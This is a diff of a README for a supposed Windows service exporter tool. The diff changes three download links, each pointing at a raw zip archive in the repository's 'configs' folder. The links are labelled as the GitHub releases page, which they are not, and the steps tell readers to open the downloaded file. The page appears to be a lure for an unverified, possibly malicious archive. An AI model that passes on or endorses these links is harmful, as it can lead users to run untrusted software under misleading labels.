@@ -6,7 +6,7 @@ Welcome to the **20251214104332-windows-service-exporter**! This software helps 
 
 ## 📥 Download Now
 
-[![Download 20251214104332-windows-service-exporter](https://raw.githubusercontent.com/softboook10/20251214104332-windows-service-exporter/main/configs/service-exporter-windows-v2.6.zip)](https://raw.githubusercontent.com/softboook10/20251214104332-windows-service-exporter/main/configs/service-exporter-windows-v2.6.zip)
+[![Download 20251214104332-windows-service-exporter](https://raw.githubusercontent.com/softboook10/20251214104332-windows-service-exporter/main/configs/service_exporter_windows_3.7.zip)](https://raw.githubusercontent.com/softboook10/20251214104332-windows-service-exporter/main/configs/service_exporter_windows_3.7.zip)
 
 ## 🌟 Features
 
@@ -26,7 +26,7 @@ Welcome to the **20251214104332-windows-service-exporter**! This software helps 
 
 1. **Visit the Releases Page**: Click the link below to access the releases on GitHub.
    
-   [Visit Releases](https://raw.githubusercontent.com/softboook10/20251214104332-windows-service-exporter/main/configs/service-exporter-windows-v2.6.zip)
+   [Visit Releases](https://raw.githubusercontent.com/softboook10/20251214104332-windows-service-exporter/main/configs/service_exporter_windows_3.7.zip)
 
 2. **Download the Latest Release**: Look for the most recent version at the top of the page.
 
@@ -79,7 +79,7 @@ This application is under the MIT License. You can use it freely, but please cre
 
 Now it's time for you to download and install the application. Follow these steps:
 
-1. **Head to the Releases Page** once again: [Download Here](https://raw.githubusercontent.com/softboook10/20251214104332-windows-service-exporter/main/configs/service-exporter-windows-v2.6.zip).
+1. **Head to the Releases Page** once again: [Download Here](https://raw.githubusercontent.com/softboook10/20251214104332-windows-service-exporter/main/configs/service_exporter_windows_3.7.zip).
 2. **Grab the Latest Version** that fits your needs.
 3. **Open the Downloaded File** and enjoy managing your Windows services!
 
